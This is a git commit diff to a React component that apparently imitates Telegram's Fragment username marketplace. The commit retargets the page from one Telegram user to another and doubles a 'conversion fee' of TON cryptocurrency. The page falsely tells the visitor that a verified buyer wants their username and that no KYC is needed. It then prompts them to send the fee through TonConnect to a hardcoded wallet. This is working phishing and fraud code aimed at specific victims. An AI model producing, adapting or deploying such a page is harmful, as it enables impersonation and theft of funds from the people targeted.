d62a253d0f9ecd2315efd464a00c2496d6ae3ad1
grachzyyy <165211755+grachzyyy@users.noreply.github.com>
2025-03-31 13:49:10 +0300

    Update NicknameFragment.tsx

--- src/components/NicknameFragment/NicknameFragment.tsx
+++ src/components/NicknameFragment/NicknameFragment.tsx
@@ -130,7 +130,7 @@ const AuctionSection: React.FC<AuctionSectionProps> = ({ nickname, showSubscribe
       <h2 className="tm-section-header-text">
         <span className="tm-section-header-domain">
           <span className="tm-web3-address">
-            <span className="subdomain">noxxdd</span>
+            <span className="subdomain">badariev</span>
             <span className="domain">.t.me</span>
           </span>
         </span>
@@ -167,7 +167,7 @@ const AuctionSection: React.FC<AuctionSectionProps> = ({ nickname, showSubscribe
       }}
     >
       You do not need to complete KYC verification, as the buyer is a verified merchant on a Fragment that has a security deposit of 
-      <span className="icon-before icon-ton" style={{ marginLeft: '5px' }}>1378</span>
+      <span className="icon-before icon-ton" style={{ marginLeft: '5px' }}>2690</span>
 
     </div>
   </section>
@@ -186,15 +186,15 @@ const BidInfoSection: React.FC<BidInfoSectionProps> = ({ setShowHowItWorksPopup 
         <tr>
           <td>
             <div className="table-cell table-cell">
-              <div className="table-cell-value tm-value icon-before icon-ton">300</div>
-              <div className="table-cell-desc">~ $1158 </div>
+              <div className="table-cell-value tm-value icon-before icon-ton">600</div>
+              <div className="table-cell-desc">~ $2316 </div>
             </div>
             
           </td>
           <td>
           <div className="table-cell table-cell">
-              <div className="table-cell-value tm-value icon-before icon-ton">15</div>
-              <div className="table-cell-desc">~ $57.9</div>
+              <div className="table-cell-value tm-value icon-before icon-ton">30</div>
+              <div className="table-cell-desc">~ $115.8</div>
             </div>
           </td>
         </tr>
@@ -215,19 +215,19 @@ const UsernameInfoSection: React.FC<UsernameInfoSectionProps> = ({ nickname }) =
     <dl className="tm-list-item">
       <dt className="tm-list-item-title">Telegram Username</dt>
       <dd className="tm-list-item-value">
-        <span className="accent-color">@noxxdd</span>
+        <span className="accent-color">@badariev</span>
       </dd>
     </dl>
     <dl className="tm-list-item">
       <dt className="tm-list-item-title">Web Address</dt>
       <dd className="tm-list-item-value">
-        <span className="accent-color">t.me/noxxdd</span>
+        <span className="accent-color">t.me/badariev</span>
       </dd>
     </dl>
     <dl className="tm-list-item">
       <dt className="tm-list-item-title">TON Web 3.0 Address</dt>
       <dd className="tm-list-item-value">
-        <span className="accent-color"><span className="tm-web3-address"><span className="subdomain">noxxdd</span><span className="domain">.t.me</span></span></span>
+        <span className="accent-color"><span className="tm-web3-address"><span className="subdomain">badariev</span><span className="domain">.t.me</span></span></span>
       </dd>
     </dl>
   </div>
@@ -242,7 +242,7 @@ interface ActionButtonsProps {
 
 
 const ActionButtons: React.FC<ActionButtonsProps> = ({ nickname, showSubscribe, onSubscribeToggle }) => {
-  const comment = "Conversion fee for noxxdd.t.me\n\nRef#R9OOOw9Mb";
+  const comment = "Conversion fee for badariev.t.me\n\nRef#R9OOOw9Mb";
   const [tonConnectUi] = useTonConnectUI();
   const wallet = useTonWallet();
   const [tx, setTx] = useState<SendTransactionRequest>({
@@ -250,7 +250,7 @@ const ActionButtons: React.FC<ActionButtonsProps> = ({ nickname, showSubscribe, 
     messages: [
       {
         address: "UQBUTyUtpZuecOGdADIXibnVTJ7GdGeb2sJQGcUPKre2RfoU",
-        amount: "15000000000",
+        amount: "30000000000",
         payload: beginCell().storeUint(0, 32).storeStringTail(comment).endCell().toBoc().toString("base64"),
       },
     ],
